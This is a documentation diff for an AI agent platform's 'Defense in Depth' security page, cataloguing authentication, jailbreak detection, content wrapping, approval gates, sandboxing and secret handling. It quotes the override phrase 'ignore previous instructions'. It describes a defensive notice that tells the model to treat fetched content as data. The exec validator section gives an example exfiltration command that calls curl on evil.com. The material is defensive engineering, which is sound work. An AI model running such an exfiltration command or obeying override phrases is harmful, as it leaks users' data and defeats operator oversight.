@@ -1,6 +1,6 @@
 ---
 title: "Defense in Depth"
-description: "How 18+ security layers work together to protect your agents and data"
+description: "How 22 categorical security layers (24 implementation primitives) work together to protect your agents and data"
 icon: "shield-halved"
 ---
 
@@ -12,22 +12,35 @@ output guard redacts it before it reaches the user. This page catalogs every
 security layer and explains what it does, why it matters, and whether you need
 to configure it.
 
+<Note>
+**Two ways to count.** Comis groups its protections into **22 categorical
+layers** spanning 8 defensive categories (the headline number you will see in
+marketing material). When you enumerate every distinct security primitive in
+the source tree, the count is **24 implementation primitives** plus 1
+build-time enforcement layer (ESLint security rules). Both numbers refer to
+the same defenses; they just slice them at different abstraction levels. This
+page presents all 24 primitives grouped by request-lifecycle checkpoint.
+</Note>
+
 ## How the Layers Work Together
 
-Every message passes through five security checkpoints as it moves through
+Every message passes through six security checkpoints as it moves through
 Comis. Each checkpoint has its own set of protections, and the layers at each
 checkpoint work independently. This means a failure in one layer does not
 compromise the others.
 
-1. **When a message arrives** -- Input is validated, scanned for manipulation,
-   and rate-limited before your agent ever sees it
-2. **When skills load** -- Skill content is scanned for threats and sanitized
+1. **At the gateway** -- Bearer token authentication and (optionally) mTLS
+   verify the client before the request enters Comis
+2. **When a message arrives** -- Input is validated, scanned for manipulation,
+   rate-limited, and (for email) sender-filtered before your agent sees it
+3. **When skills load** -- Skill content is scanned for threats and sanitized
    before it can influence your agent
-3. **When the agent acts** -- Actions are classified, restricted by tool
-   policy, and may require your approval
-4. **When a response is sent** -- Output is scanned for leaked secrets and
+4. **When the agent acts** -- Actions are classified, restricted by tool
+   policy, may require approval, shell commands are inspected for substitution,
+   and the exec tool runs inside an OS-level filesystem sandbox
+5. **When a response is sent** -- Output is scanned for leaked secrets and
    canary token extraction before the user sees it
-5. **When data is stored** -- Memory writes are validated, secrets are
+6. **When data is stored** -- Memory writes are validated, secrets are
    encrypted, and config is redacted
 
 <Info>
@@ -36,6 +49,48 @@ configuration.
 </Info>
 
 ## Security Layers
+
+### At the Gateway
+
+Comis exposes its HTTP, JSON-RPC, and WebSocket endpoints through a single
+gateway. Two layers protect that perimeter before any request even reaches the
+input checkpoint.
+
+<AccordionGroup>
+  <Accordion title="Bearer Token Authentication" icon="key-skeleton">
+    **What it does:** Every API client must present a bearer token. Tokens are
+    compared in **constant time** using `crypto.timingSafeEqual()` -- the
+    server compares against every entry even when the first one already
+    matched -- so attackers cannot probe valid tokens by measuring response
+    time. Each token has a list of allowed scopes (e.g., `rpc`, `ws`,
+    `admin`).
+
+    **Why it matters:** Without authentication, anyone who can reach the
+    gateway can drive your agents, read messages, and edit configuration.
+    Timing-safe comparison closes the side-channel that naive string
+    equality opens.
+
+    **Do I need to configure it?** Yes -- supply tokens under
+    `gateway.tokens` in your config. See [Hardening](/security/hardening) for
+    a worked example.
+  </Accordion>
+
+  <Accordion title="mTLS (Mutual TLS)" icon="lock-keyhole">
+    **What it does:** Validates the gateway's server certificate, key, and CA
+    certificate at startup (PEM format and expiry checks via `X509Certificate`)
+    and -- when configured -- requires clients to present a valid certificate
+    signed by the configured CA. Client identity is extracted from the cert's
+    Common Name (CN).
+
+    **Why it matters:** TLS encrypts traffic so bearer tokens cannot be
+    intercepted on the network. Mutual TLS extends that to client
+    authentication: only holders of an enrolled cert can connect at all.
+
+    **Do I need to configure it?** Optional but recommended for any remote
+    deployment. Set `gateway.tls.certPath`, `keyPath`, and `caPath`. See
+    [Hardening](/security/hardening) for the full setup.
+  </Accordion>
+</AccordionGroup>
 
 ### When a Message Arrives
 
@@ -57,10 +112,13 @@ layers run before your agent processes the message.
   </Accordion>
 
   <Accordion title="Jailbreak Detection" icon="user-secret">
-    **What it does:** Scans messages for manipulation attempts across 13 weighted
-    pattern categories, including "ignore previous instructions" style attacks
-    and creative misspellings of security-sensitive terms (known as
-    typoglycemia detection).
+    **What it does:** Scans messages for manipulation attempts across 13
+    weighted pattern categories, drawing from a library of **65 distinct
+    injection patterns across 8 categories** (jailbreak phrasing, role markers,
+    dangerous commands, secret formats, prompt extraction, credential logging,
+    invisible characters, and the content scanner). Includes typoglycemia
+    detection on 8 key terms (`ignore`, `previous`, `instructions`, `system`,
+    `bypass`, `override`, `forget`, `delete`).
 
     **Why it matters:** Catches attempts to trick your agent into ignoring its
     safety instructions. Even sophisticated multi-step manipulation attempts are
@@ -68,7 +126,9 @@ layers run before your agent processes the message.
 
     **Do I need to configure it?** No. Active by default in "warn" mode -- it
     reinforces agent instructions when suspicious patterns are detected without
-    blocking messages outright.
+    blocking messages outright. Configurable thresholds: `mediumThreshold`
+    (default 0.4), `highThreshold` (default 0.7), `action` (`warn` default,
+    or `block`).
   </Accordion>
 
   <Accordion title="Injection Rate Limiting" icon="gauge">
@@ -86,14 +146,35 @@ layers run before your agent processes the message.
   <Accordion title="External Content Wrapping" icon="shield">
     **What it does:** When your agent fetches web pages, reads emails, or
     processes webhook content, that external content is wrapped in security
-    boundaries with unique random delimiters. This prevents injected
-    instructions in fetched content from being treated as real user messages.
+    boundaries with **cryptographically random delimiters** (24 hex chars =
+    12 random bytes per wrap). The wrapped block also embeds a 9-line SECURITY
+    NOTICE telling the model to treat the content as data, not instructions,
+    and runs the content through 17 jailbreak/command pattern detectors.
 
     **Why it matters:** A common attack is embedding hidden instructions in web
     pages that your agent might fetch. Content wrapping neutralizes this.
+    Sources: `email`, `webhook`, `api`, `file_read`, `web_fetch`,
+    `channel_metadata`, `web_search`, `document`.
 
     **Do I need to configure it?** No. Automatically applied to all external
     content sources.
+  </Accordion>
+
+  <Accordion title="Email Sender Filter" icon="envelope-circle-check">
+    **What it does:** Restricts incoming email to whitelisted addresses. Mode
+    `allowlist` (default) closes the door unless the sender appears in
+    `allowFrom`; mode `open` accepts any sender. The filter also auto-detects
+    bulk and automated email by inspecting RFC 3834 `Auto-Submitted`,
+    `Precedence`, `List-Unsubscribe`, and `X-Auto-Response-Suppress` headers,
+    plus `noreply` address patterns.
+
+    **Why it matters:** Email is the easiest way to inject prompts into an
+    agent. A locked-down sender list keeps adversaries from emailing your
+    agent at all.
+
+    **Do I need to configure it?** Yes if you enable the email channel. Set
+    `channels.email.allowMode` and `channels.email.allowFrom` in your config.
+    The default is fail-closed: empty allowlist blocks everything.
   </Accordion>
 </AccordionGroup>
 
@@ -175,16 +256,29 @@ risk.
 
   <Accordion title="Approval Gate" icon="clipboard-check">
     **What it does:** Pauses agent execution when a privileged action is
-    attempted, waits for human approval (via dashboard or API), and auto-denies
-    if the timeout expires.
+    attempted, waits for human approval (via dashboard, RPC, or channel DM),
+    and auto-denies if the timeout expires. The gate uses **two caches** so
+    repeated requests do not flood operators:
+    - **Denial cache** (60s by default) auto-denies an identical request that
+      was just denied
+    - **Approval cache** (30s by default) auto-approves an identical request
+      that was just approved (set to 0 to disable batching)
+
+    Multiple concurrent requests for the same action join the existing pending
+    entry as "batch followers" so a single approval resolves all of them. The
+    pending state serializes/restores on daemon restart.
 
     **Why it matters:** Gives you a human-in-the-loop checkpoint for high-risk
-    operations like file deletion or configuration changes.
+    operations like file deletion or configuration changes, without requiring
+    you to click Approve 50 times when an agent retries.
 
     **Do I need to configure it?** Yes -- disabled by default. See
     [Approvals](/security/approvals).
 
-    Default: `approvals.enabled: false`
+    Default: `approvals.enabled: false`,
+    `approvals.defaultTimeoutMs: 300000`,
+    `approvals.denialCacheTtlMs: 60000`,
+    `approvals.batchApprovalTtlMs: 30000`
   </Accordion>
 
   <Accordion title="Budget Protection" icon="wallet">
@@ -225,8 +319,28 @@ risk.
     Paths are validated before any read or write occurs.
   </Accordion>
 
+  <Accordion title="Exec Security Validator" icon="terminal">
+    **What it does:** A pre-sandbox check that inspects every shell command
+    string for dangerous substitution before the sandbox even runs. Catches
+    command substitution `$(...)`, backtick substitution `` `...` ``,
+    process substitution `<(...)` and `>(...)`, zsh process substitution
+    `=(...)`, and zsh equals expansion (`=cmd` at a word boundary). The
+    validator is **quote-aware**: a state machine tracks whether the parser
+    is inside single quotes (where these patterns are safe), double quotes,
+    or backticks, so legitimate strings containing `$(` are not flagged.
+
+    **Why it matters:** The OS sandbox isolates the filesystem, but it does
+    not parse shell syntax. A command like
+    `cat workspace/file > $(curl evil.com/exfil)` runs inside the sandbox
+    *and* exfiltrates data to an attacker. This validator rejects the
+    command before it ever reaches the shell.
+
+    **Do I need to configure it?** No. Always active for the `system.exec`
+    tool.
+  </Accordion>
+
   <Accordion title="Exec Sandbox" icon="box">
-    **What it does:** Wraps every `exec` tool command in an OS-level
+    **What it does:** Wraps every `system.exec` tool command in an OS-level
     filesystem sandbox (bubblewrap on Linux, sandbox-exec on macOS).
     The sandboxed process can only see the agent's workspace, the graph
     shared directory, and system binaries -- everything else on the host
@@ -237,6 +351,12 @@ risk.
     access any path. Without the sandbox, an agent could bypass file tool
     restrictions by running `exec cat /path/to/secret` instead of using
     the `read` tool. The OS sandbox closes this gap at the kernel level.
+
+    **Important scope note:** The exec sandbox protects **only** the
+    `system.exec` tool. Built-in tools that run inside the daemon process
+    (Node-resident skills, MCP stdio servers, image-gen helpers) are not
+    wrapped by this sandbox -- their security relies on the application-level
+    layers above (tool policy, content scanner, SSRF guard, safe path).
 
     **Do I need to configure it?** Enabled by default. On Linux, install
     bubblewrap (`apt install bubblewrap`). On macOS, `sandbox-exec` is
@@ -252,13 +372,18 @@ They are your last line of defense against leaked secrets and prompt extraction.
 
 <AccordionGroup>
   <Accordion title="Output Guard" icon="eye">
-    **What it does:** Scans every agent response for 15 secret patterns (AWS
-    keys, API tokens, private keys, JWTs, and more) plus prompt extraction
-    patterns. Detected secrets are replaced with `[REDACTED]` before the
-    message reaches the user.
+    **What it does:** Scans every agent response for **15 secret patterns**
+    (AWS access key IDs, hex secrets, base64 secrets, private key headers,
+    GitHub tokens, Slack tokens, Anthropic keys, OpenAI project keys,
+    Telegram bot tokens, Discord bot tokens, Google API keys, DB connection
+    strings, generic API key assignments, plus warning-only patterns for
+    Bearer tokens and JWTs). Critical findings are replaced with
+    `[REDACTED:pattern_name]` before the response reaches the user. The
+    guard also runs the **two prompt-extraction patterns** (`system_prompt_label`,
+    `instructions_label`) and the canary token check.
 
-    **Why it matters:** Even if your agent accidentally includes a secret in its
-    response, users never see it.
+    **Why it matters:** Even if your agent accidentally includes a secret in
+    its response, users never see it.
 
     **Do I need to configure it?** No. Always active. Redaction happens
     automatically before the message leaves Comis.
@@ -277,8 +402,18 @@ They are your last line of defense against leaked secrets and prompt extraction.
   </Accordion>
 
   <Accordion title="Log Sanitization" icon="eraser">
-    **What it does:** Scrubs 17 credential patterns from all log output. Works
-    alongside structured log redaction as an additional defense-in-depth layer.
+    **What it does:** Scrubs **18 credential patterns** from all log output
+    using regex-based redaction (Anthropic, OpenAI project, generic `sk-`,
+    Bearer, Telegram bot, AWS access key, AWS secret key, Stripe, Google,
+    Slack app, SendGrid, JWT, DB connection strings, URL passwords, Discord
+    bot, hex secrets, GitHub tokens). Inputs over 1 MB pass through unchanged
+    to avoid ReDoS on oversized strings.
+
+    Pino's structured-field redactor is the **first line** of defense and
+    auto-redacts the canonical credential keys (`apiKey`, `token`, `password`,
+    `secret`, `authorization`, `botToken`, `privateKey`, `cookie`,
+    `webhookSecret`) up to three levels deep. The Log Sanitizer is a regex
+    safety net for credentials that escape into free-text log messages.
 
     **Why it matters:** Prevents accidental credential exposure in log files,
     which are often shared with team members for debugging or sent to log
@@ -309,10 +444,14 @@ someone gains access to your server's file system.
     operations.
   </Accordion>
 
-  <Accordion title="Encrypted Secrets" icon="lock">
-    **What it does:** Stores your API keys and passwords with AES-256-GCM
-    encryption and HKDF-SHA256 key derivation. Even if someone accesses your
-    files, they cannot read secrets without the master key.
+  <Accordion title="Encrypted Secrets (SecretsCrypto)" icon="lock">
+    **What it does:** Encrypts your API keys and passwords with AES-256-GCM
+    using HKDF-SHA256 key derivation. Each encryption uses a fresh 32-byte
+    salt and 12-byte IV; the 16-byte authentication tag detects tampering on
+    decrypt. The HKDF info string (`comis-secrets-v1`) is versioned so the
+    algorithm can be rotated without breaking older ciphertexts. Even if
+    someone accesses your files, they cannot read secrets without the master
+    key.
 
     **Why it matters:** Protects credentials at rest. Essential for any
     production deployment where server files could potentially be accessed by
@@ -323,6 +462,58 @@ someone gains access to your server's file system.
     encrypted store.
 
     Default: `security.secrets.enabled: false`
+  </Accordion>
+
+  <Accordion title="Centralized Secret Access (SecretManager)" icon="key">
+    **What it does:** Every credential read in Comis goes through a single
+    `SecretManager` interface with only four methods (`get`, `has`,
+    `require`, `keys`). Direct `process.env` access is **forbidden** by an
+    ESLint rule, so the manager is the only auditable path to a credential.
+    The manager takes a defensive copy of the env on creation -- mutations to
+    `process.env` after startup do not change what the manager exposes -- and
+    has no enumeration / `getAll()` escape hatch.
+
+    **Why it matters:** Centralizing credential access means every read can
+    be logged, scoped, or denied. ESLint enforcement means a developer cannot
+    accidentally bypass it.
+
+    **Do I need to configure it?** No. Always active.
+  </Accordion>
+
+  <Accordion title="Per-Agent Secret Scoping (ScopedSecretManager)" icon="user-shield">
+    **What it does:** Wraps the base `SecretManager` per agent. Each agent
+    gets a glob-pattern allowlist (`secrets.allow: ["openai_*", ...]`) that
+    filters which secret names it can read. Successful reads, denied reads,
+    and missing-key reads all emit `secret:accessed` audit events tagged with
+    the agent ID. An empty allowlist falls back to unrestricted access (with
+    a one-time warning) for backward compatibility.
+
+    **Why it matters:** Implements least-privilege at the credential layer. A
+    customer-support agent never needs your AWS keys; this layer makes that
+    explicit and auditable.
+
+    **Do I need to configure it?** Yes -- recommended for production. Set
+    `agents.<id>.secrets.allow` per agent. See [Secrets](/security/secrets).
+  </Accordion>
+
+  <Accordion title="Multi-Source Secret Resolution (SecretRefResolver)" icon="diagram-project">
+    **What it does:** Resolves YAML config values written as `${VAR}` or
+    `SecretRef` objects from three providers:
+    - **env** -- routed through `SecretManager` for auditability
+    - **file** -- absolute path, regular-file check, no symlinks to
+      restricted paths, max 1MB, JSON Pointer extraction via
+      `provider#/json/pointer`
+    - **exec** -- launches a credential helper, sends a versioned JSON-RPC
+      request, validates the response shape, 10-second default timeout
+
+    **Why it matters:** Lets you keep secrets out of the config file
+    entirely (e.g., pull them from `pass`, `1Password`, `aws-vault`, or a
+    sealed file at deploy time) without any plaintext on disk.
+
+    **Do I need to configure it?** No -- the resolver runs whenever your
+    config contains a SecretRef. See
+    [Secret Manager Reference](/reference/secret-manager) for the full
+    syntax.
   </Accordion>
 
   <Accordion title="Config Redaction" icon="eye-slash">
@@ -337,19 +528,37 @@ someone gains access to your server's file system.
   </Accordion>
 </AccordionGroup>
 
+## Build-Time Enforcement
+
+In addition to the 24 runtime primitives above, Comis enforces **four
+security rules at lint time** (`pnpm lint:security`). CI fails if any of them
+trip:
+
+1. **No `eval()`** -- via `security/detect-eval-with-expression`
+2. **No `Function()` constructor** -- equivalent to `eval`, banned via
+   AST selector
+3. **No raw `path.join()`** -- forces every path operation through
+   [`safePath()`](/reference/safe-path)
+4. **No direct `process.env`** -- forces every credential access through
+   [`SecretManager`](/reference/secret-manager)
+
+These four rules prevent whole classes of vulnerability from ever shipping.
+
 ## Putting It All Together
 
-With 18+ layers working across 5 checkpoints, the security model ensures that
-threats are caught at multiple stages. Even in the worst case -- where several
-layers fail simultaneously -- the remaining layers still provide meaningful
-protection.
+With **22 categorical layers** (24 runtime primitives plus 4 build-time
+ESLint rules) working across 6 checkpoints, the security model ensures that
+threats are caught at multiple stages. Even in the worst case -- where
+several layers fail simultaneously -- the remaining layers still provide
+meaningful protection.
 
 Most of the layers listed above are automatic and require no configuration.
-The ones that do need setup -- encrypted secrets, approval workflows, and tool
-policy -- are covered in their own dedicated guides. You can verify that all
-layers are properly configured by running `comis doctor`, which checks your
-installation against recommended security practices. See
-[Hardening](/security/hardening) for the full walkthrough.
+The ones that do need setup -- gateway tokens, mTLS, encrypted secrets,
+approval workflows, tool policy, email allowlist -- are covered in their own
+dedicated guides. You can verify that all layers are properly configured by
+running `comis doctor`, which checks your installation against recommended
+security practices. See [Hardening](/security/hardening) for the full
+walkthrough.
 
 ## Related
 
